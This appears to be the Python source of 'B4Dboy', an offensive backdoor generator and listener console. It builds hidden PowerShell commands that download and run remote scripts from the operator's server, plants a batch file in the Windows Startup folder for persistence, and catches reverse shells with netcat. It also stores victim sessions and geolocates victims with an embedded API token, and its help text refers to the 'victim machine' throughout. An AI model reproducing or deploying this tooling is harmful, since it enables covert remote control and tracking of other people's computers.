#!/bin/python3
from colorama import Fore, init
import readline as rdl
import random as r
import subprocess
import requests
import json
import os
# My libs
import payloads.payfile as payfile
import netcat

init()
def banner():
    print(Fore.MAGENTA)
    print("┏━━━━━━━━━━┓              ┏━━┓           ┏━━━━━━━━┓      ┏━━━━━━━━━━┓     ┏━━━━━━━━━━━━┓━┓     ┏━━━┓       ┏━━━┓   ")
    print("┃  ┏━━━━━┓ ┗┓            ┏┛  ┗┓          ┃ ┏━━━━┓ ┗┓     ┃  ┏━━━━━┓ ┗┓    ┃            ┃▒┃     ┗┓  ┗┓     ┏┛  ┏┛   ")
    print("┃  ┃     ┗┓ ┗┓          ┏┛    ┗┓         ┃ ┃    ┗┓ ┗┓    ┃  ┃     ┗┓ ┗┓   ┃            ┃▒┃      ┗┓  ┗┓   ┏┛  ┏┛    ")
    print("┃  ┃     ┏┛ ┏┛         ┏┛ ┏━━┓ ┗┓        ┃ ┃     ┗┓ ┗┓   ┃  ┃     ┏┛ ┏┛   ┃            ┃▒┃       ┗━┓ ┗┓ ┏┛ ┏━┛     ")
    print("┃  ┗━━━━━┛┏━┛         ┏┛ ┏┛  ┗┓ ┗┓       ┃ ┃      ┗┓ ┃   ┃  ┗━━━━━┛┏━┛    ┃         ┏┓ ┃▒┃         ┗┓ ┗━┛ ┏┛       ")
    print("┃  ┏━━━━━┓┗━┓        ┏┛  ┗━━━━┛  ┗┓      ┃ ┃      ┏┛ ┃   ┃  ┏━━━━━┓┗━┓    ┃         ┗┛ ┃▒┃          ┗┓   ┏┛        ")
    print("┃  ┃     ┗┓ ┗┓      ┏┛ ┏━━━━━━━━┓ ┗┓     ┃ ┃     ┏┛ ┏┛   ┃  ┃     ┗┓ ┗┓   ┃            ┃▒┃           ┃   ┃         ")
    print("┃  ┃     ┏┛ ┏┛     ┏┛ ┏┛        ┗┓ ┗┓    ┃ ┃    ┏┛ ┏┛    ┃  ┃     ┏┛ ┏┛   ┃            ┃▒┃           ┃   ┃         ")
    print("┃  ┗━━━━━┛ ┏┛     ┏┛ ┏┛          ┗┓ ┗┓   ┃ ┗━━━━┛ ┏┛     ┃  ┗━━━━━┛ ┏┛    ┃            ┃▒┃           ┃   ┃         ")
    print("┗━━━━━━━━━━┛      ┗━━┛            ┗━━┛   ┗━━━━━━━━┛      ┗━━━━━━━━━━┛     ┗━━━━━━━━━━━━┛━┛           ┗━━━┛         ")
    print(Fore.RESET)


# Commands
def generate_bd():
    # Payloads to server
    os.system('cp payloads/win/* server/b4dboy/payloads/')
    os.system('cp payloads/linux/* server/b4dboy/payloads/')

    args = action
    for arg in args:
        if "-p"  in arg or "--persistant": pers = True
        if "-os" in arg: osArg = arg; osT = osArg.split(osArg[3])[1]
        if "-T" in arg: timeArg = arg; timer = timeArg.split(timeArg[2])[1]
        else: timer = ""
        if "-t" in arg: typeArg = arg; type = typeArg.split(typeArg[2])[1]
        else: type = "simple"     
        if "-lip" in arg: ip = arg; ip = ip.split(ip[4])[1]
        else:
            ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
            for value in ip:
                if "/24" in value: break
            ip = value[9:][:15].split("/")[0].split(".")

    port = r.randint(1000,65534)
    outport = str(subprocess.check_call('netstat | grep {port} | wc -l', shell=True))[2:][:-1]
    if int(outport) != 0: port = r.randint(10000, 65534)

    if osT == "windows" or osT == "win":
        
        system = "Windows"
        id=make_id()
        os.system(f'mkdir -p server/b4dboy/{id}')
        payload = payfile.get_payload(ip, port)    
        with open(f"server/b4dboy/{id}/ps.ps1","w") as bdF: bdF.write(payload); bdF.close()  # Primary payload Maker

        tempPayload = 'function loop {\n    powershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1'"+')"\n    Start-Sleep -Seconds 30\n    loop\n}\nloop'
        os.system("echo "+'"IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')" '+"> server/b4dboy/"+id+"/evoke.txt")  # Payload executed on Startup (Evoke.txt) Maker
        with open(f"server/b4dboy/{id}/temp.ps1","w") as tpF: tpF.write(tempPayload); tpF.close()  # Loop request (temp.ps1) Maker
        os.system(f'sudo cp payloads/win/converted.txt server/b4dboy/{id}') # Bb.bat / ejecuter on start
        with open(f"server/b4dboy/{id}/infect.ps1", "w") as ifc:
            ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; wget http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/converted.txt -o Bb.bat")
            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt -o evoke.txt")
            ifc.write('\npowershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')"')
        ifc.close()
                
        payloadS = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1')"+'"'
        payloadT = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/infect.ps1')"+'"'

        ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
        if not pers:
            print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system(f'{config["ncli"]} -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
            if del_ver != "n" and del_ver != "N": os.system(f'rm -rf server/b4dboy/{id}')
            else: store_session(id, system, get_ip(), str(port), "", "")
        else: 
            print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+"")
            input("Press enter to save session...")
            ip = get_ip()
            store_session(id, system, port=str(port), ip=ip)
    
    elif osT == "linux":
        system = "Linux"
        payload = ''

def gen_pld():
    ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
    for value in ip:
        if "/24" in value: break
    ip = value[9:][:12].split(".")

    args = action
    for arg in args:
        if "-ip" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/ip.ps1')"+'"')
        elif "-os" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/os.ps1')"+'"')
        elif "-ssh" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/ssh.ps1')"+'"')
        elif "-info" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/info.ps1')"+'"')

def mod_log():
    args = action
    for arg in args:
        if "-m" in arg:
            if "--mod" in arg:  id = arg.split(arg[5])[1].split("=")[0]
            else: id = arg.split(arg[2])[1].split("=")[0]
            for pars in range(2, len(args)):
                if "=" in args[pars]: field = args[pars].split('=')[0]; value = args[pars].split('=')[1]
                elif ":" in args[pars]: field = args[pars].split(':')[0]; value = args[pars].split(':')[1]
                else: print("Unexpected value in : "+args[pars])
                with open("logs/sessions.json", "r") as sesF:
                    sessData = sesF.read()
                    lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
                    sessData = []
                    for l in lista:
                        sessData.append(json.loads(l))
                    for sess in sessData:
                        if sess['sess_id'] == id:
                            remove_session(id)
                            if field == "user": store_session(sess['sess_id'], value, sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
                            elif field == "admin": store_session(sess['sess_id'], sess["user"], value, sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
                            elif field == "users": store_session(sess['sess_id'], sess["user"], sess["admin"], value, sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
                            elif field == "os": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], value, sess["ip"], sess["port"], sess["system"], sess["pubip"])
                            elif field == "ip": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], value, sess["port"], sess["system"], sess["pubip"])
                            elif field == "port":store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], value, sess["system"], sess["pubip"])
                            elif field == "system": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], value, sess["pubip"])
                            elif field == "pubip":store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], value)
                            else: print("[-] Err : field on sessions data don´t exist. Please read the README.md for more info.")
                        os.system('clear')
                        banner()
                        print(f"[+] {field} updated successfully")
        elif "-r" in arg:
            if "--remove" in arg: id = arg.split(arg[8])[1]
            else: id = arg.split(arg[2])[1]
            remove_session(id)
        elif "-gc" in arg:
            if "--geo" in arg: id = arg.split(arg[5])[1]
            else: id = arg.split(arg[3])[1]
            pars = args[args.index(arg)+1]
            pubip = pars.split(pars[2])[1]
            r = requests.get("https://www.ipinfo.io/"+pubip+"?token=a70e36470018f5")
            data = json.loads(r.text)
            with open("logs/geo.json", "r") as geoF: dato = geoF.read(); geoF.close()
            if dato != "" : 
                with open("logs/geo.json", "w") as geoF: geoF.write(dato[:-1]+',{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
            else : 
                with open("logs/geo.json", "w") as geoF: geoF.write('[\n{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
        elif "-gm" in arg:
            if "--geo-mod" in arg: id = arg.split(arg[9])[1]
            else: id = arg.split(arg[3])[1]
            Nid = args[args.index(arg)+1]
            remove_geo(id)
            with open("logs/geo.json", "r") as gFOld: oldData = gFOld.read(); gFOld.close()
            with open("logs/geo.json", "w") as geoF: geoF.write(oldData[:-1]+'[\n{\n    "sess_id":"'+Nid+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
                    
        elif "-c" in arg:
            with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
            print("[+] Data deleted successfully. ")

def mod_sess(search, value, field, dato):
    file = open('logs/sessions.json', 'r', encoding='utf8')
    data = file.read()[1:][:-1].replace(',{',',{{').split(',{')
    file.close()
    file = open('logs/sessions.json', 'w', encoding='utf8')
    file.write('[')
    for d in data:
        di = json.loads(d)
        if di[search] == value: di[field] = dato
        if data.index(d) == len(data)-1: file.write('\n    {\n        "sess_id":"'+di["sess_id"]+'",\n        "os":"'+di["os"]+'",\n        "ip":"'+di["ip"]+'",\n        "port":"'+di["port"]+'",\n        "system":"'+di["system"]+'",\n        "pubip":"'+di["pubip"]+'"\n    }')
        else: file.write('\n    {\n        "sess_id":"'+di["sess_id"]+'",\n        "os":"'+di["os"]+'",\n        "ip":"'+di["ip"]+'",\n        "port":"'+di["port"]+'",\n        "system":"'+di["system"]+'",\n        "pubip":"'+di["pubip"]+'"\n    },')
    file.write('\n]')

def start_ses():
    ses = ""
    lst = ""
    args = action
    for arg in args:
        if "--session" in arg: ses = arg.split(arg[9])[1]
        elif "-s" in arg: ses = arg.split(arg[2])[1]
        if "--listen" in arg: lst = arg.split(arg[8])[1]
        elif "-l" in arg: lst = arg.split(arg[2])[1]
    if ses != "":
        with open("logs/sessions.json", "r") as sesF:
            sessData = sesF.read()
            lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
            sessData = []
            for arg in lista:
                sessData.append(json.loads(arg))
            for sess in sessData:
                if ses == sess['sess_id']: port = sess['port']
        print("Waiting for connections on : "+port+"...  ¡This action may take 5 min!")
        os.system(f'{config["ncli"]} -lp '+port)
        mod_sess("sess_id", ses, "ip", get_ip())
    elif lst != "":
        print("Waiting for connections on : "+lst)
        os.system(f'{config["ncli"]} -lp '+lst)
    else:
        print("[-] Err : No Parameter given ")

def show_info():
    if action[1] == "-s" or action[1] == "--sessions":
        with open("logs/sessions.json", "r") as sesF:
            sessData = sesF.read()
            if sessData != "":
                sessLen = sessData.count("{")+sessData.count("}")
                sessLen = int(sessLen/2)

                lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
                sessData= []
                for arg in lista:
                    sessData.append(json.loads(arg))
                print("Session ID     Os Type      Local IP      Port    |      Specific Os           Public Ip")
                print("- - - - -      - - - -    - - - - - -     - - -        - - - - - - - -      - - - - - - - -")
                for session in range(0, sessLen):
                    session = sessData[session]
                    if session['system'] == "" and session['pubip'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        Null                Null")
                    elif session['pubip'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        {session['system']}     Null")
                    elif session['system'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        Null                 {session['pubip']}")
                    else: print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        {session['system']}      {session['pubip']}")
            else:
                print("[-] Err : No sessions stored.")
        sesF.close()
    elif action[1] == "-g" or action[1] == "--geo":
        print("[-] Geolocalization will be available soon")
    elif action[1] == "-c" or action[1] == "--config":
        print("Config Values :")
        print("Ncli : "+config["ncli"])
        print("Token : "+config["token"] if config["token"] != "" else "Token : <no-set>")
        print("Dictionary : "+config["dictionary"])
    else: print("[-] Err: Parameter missing.")

def mod_config(args):
    for arg in args:
        with open(".config.json", "r") as configF:
            conf = json.loads(configF.read())
        configF.close()
        if "-n" in arg:
            if "--ncli" in arg: ncli = arg.split(arg[6])[1]
            else: ncli = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "ncli":"'+ncli+'"\n}'); confF.close()
        if "-t" in arg:
            if "--token" in arg: token = arg.split(arg[7])[1]
            else: token = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "ncli":"'+config["ncli"]+'"\n}'); confF.close()
        if "-d" in arg:
            if "--dictionary" in arg: dictionary = arg.split(arg[13])[1]
            else: dictionary = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "ncli":"'+config["ncli"]+'"\n}'); confF.close()
    print("[+] Config updated succesfully")

def help_panel():
    print("Commands : \n")
    print("generate/gen\n      -os                 This designate operating system of the victim machine : windows/linux\n      -lip                This parameter set attacker ip manually : 10.0.0.15\n      -t                  This designate the type of attack : simple/global  ¡¡global tokens are avaible on our discord server!!\n      -T                  If want start listen just after of execution or want store session : start/store\n")
    print("payloads/pay\n      -ip                 Send request using api's for get public ip and geolocation of victim machine\n      -os                 Obtain system information")
    print("log\n      -m/--mod            Modify data stored from sessions : -m:<id> ip=10.0.0.2\n      -r/--remove         Remove specified session from log : -r=<id>\n      -c/--clean          Delete all data from sessions log\n      -gc/--geo            create geolocation log : -gc=<id> ip:<public ip>\n      -gm/--geo-mod       Modify geolocation data of a session")
    print("start\n      -s/--session        Use for start a stored session using id : -s:<id>\n      -l/--listen         Use for start listen on a port : -l=2925\n")
    print("show\n      -s/--sessions       Show all sessions stored\n      -g/--geo            Show geographic information about sessions\n      -c/--config         Use for display config\n")
    print("config\n      -n/--ncli       Config the netcat client\n      -t/--token          Set or add token of ngrok\n      -d/--dictionary     Modify the parameters for create session id\n")

# Functions
def setup():
    with open(".config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
    # Config
    if config["ncli"] == "":
        cli = netcat.detect_cli()
        banner()
        if cli == 0:
            netcat.install_cli(netcat.detect_os())
            print(f"[!] please run>config -n={netcat.detect_cli()}")
        else: print(f"[!] please run>config -n={cli}")
    else: banner()
    ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
    for value in ip:
        if "/24" in value: break
    ip = value[9:][:15].split("/")[0].split(".")
    subprocess.Popen(f'sudo ./server.sh listen {ip[0]} {ip[1]} {ip[2]} &', shell=True)
    # Services
    if not os.path.exists("/root/.config/ngrok/ngrok.yml"):
        if config["token"] != "": print("[*] Configurando ngrok..."); os.system(f'wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /root/ngrok.tgz -o /root/out && rm /root/out && tar -xf /root/ngrok.tgz && chmod +x /root/ngrok && /root/./ngrok config add-authtoken {config["token"]}'); print("[+] Ngrok configured succesfully")
        else: print("[!] Ngrok not configured")
    else: print("[*] Ngrok is active") 

def make_id():
    id = ""
    dictionary = config['dictionary']
    for a in range(0, 9):
        id = id+(dictionary[r.randint(0, len(dictionary)-1)])
    return id

def get_ip():
    try:
        with open("output.txt", "r") as ipF:
            data = ipF.read().split('\n')[-2].split(' -')[0]
        ipF.close()
    except: data = ""
    return data

def store_session(sess_id, user="", admin="", users=[], osT="", ip="", port="", system="", pubip=""):
    with open("logs/sessions.json", "r") as oldSes:
        oldData = oldSes.read()
    oldSes.close()
    with open("logs/sessions.json", "w") as sesF:
        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('    {\n        "sess_id":"'+sess_id+'",\n        "user":"'+user+'",\n        "admin":"'+admin+'",\n        "users":'+str(users).replace("'",'"',)+',\n        "os":"'+osT+'",\n        "ip":"'+ip+'",\n    "    port":"'+port+'",\n        "system":"'+system+'",\n        "pubip":"'+pubip+'"\n}\n]')
        else: sesF.write('[\n    {\n        "sess_id":"'+sess_id+'",\n        "user":"'+user+'",\n        "admin":"'+admin+'",\n        "users":'+str(users).replace("'",'"',)+',\n        "os":"'+osT+'",\n        "ip":"'+ip+'",\n        "port":"'+port+'",\n        "system":"'+system+'",\n        "pubip":"'+pubip+'"\n}\n]')
    sesF.close()
    os.system('clear')
    banner()
    print("[+] Session stored successfully")

def remove_session(id):
    with open("logs/sessions.json", "r") as sesF:
        sessData = sesF.read()
        lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
        sessData = []
        for l in lista:
            sessData.append(json.loads(l))
        for sess in sessData:
            if sess['sess_id'] == id: sessData.remove(sess)
    sesF.close()
    with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close()
    for sess in sessData:
        store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess['os'], sess['ip'], sess['port'], sess['system'], sess['pubip'])
    os.system('clear')
    banner()
    print("[+] Session removed successfully")

def remove_geo(id):
    with open("logs/geo.json", "r") as sesF:
        sessData = sesF.read()
        lista = sessData.replace("[","").replace("]","").split(",")
        sessData = []
        print(lista)
        for arg in lista:
            sessData.append(json.loads(arg))
        for session in sessData:
            if id == session['sess_id']:
                sessData.remove(session)
    sesF.close()
    with open("logs/geo.json", "w") as sesF:
        for sess in sessData:
            sesF.write('\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}')
            if sessData.index(sess) == len(sessData): sesF.write("\n]")
            else: sesF.write("\n,")
    sesF.close()
    os.system('clear')
    banner()
    print("[+] Session removed successfully")

# Interpreter
histfile = ".bb_history"
try:
    rdl.read_history_file(histfile)
except FileNotFoundError:
    open(histfile, 'wb').close()
    rdl.read_history_file(histfile)
setup()
while True:
    with open(".config.json", "r") as cFile:
        config = json.loads(cFile.read())
    try:
        action = input("B4Dboy > ").split(' ')
        rdl.add_history(' '.join(action))
        if action[0] != "":
            if action[0] == "h" or action[0] == "help":
                help_panel()
            elif action[0] == "gen" or action[0] == "generate":
                if len(action) > 1: generate_bd()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "log":
                if len(action) > 1: mod_log()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "start":
                if len(action) > 1: start_ses()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "show":
                if len(action) > 1: show_info()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "config":
                if len(action) > 1 and action[1] !="" : mod_config(action)
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "clear":
                os.system('clear'); banner()
            elif action[0] == "rem":
                remove_geo("123")
            elif action[0] == "exit":
                print("Saliendo ...")
                os.system('kill $(pgrep -f "python -m http.server 80 -d server")')
                os.system('clear')
                exit()
    except KeyboardInterrupt:
        close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
        if close_vrf != "n" and close_vrf != "N":
            print("Saliendo ...")
            os.system('kill $(pgrep -f "python -m http.server 80 -d server")')
            os.system('clear')
            exit()

rdl.write_history_file(histfile)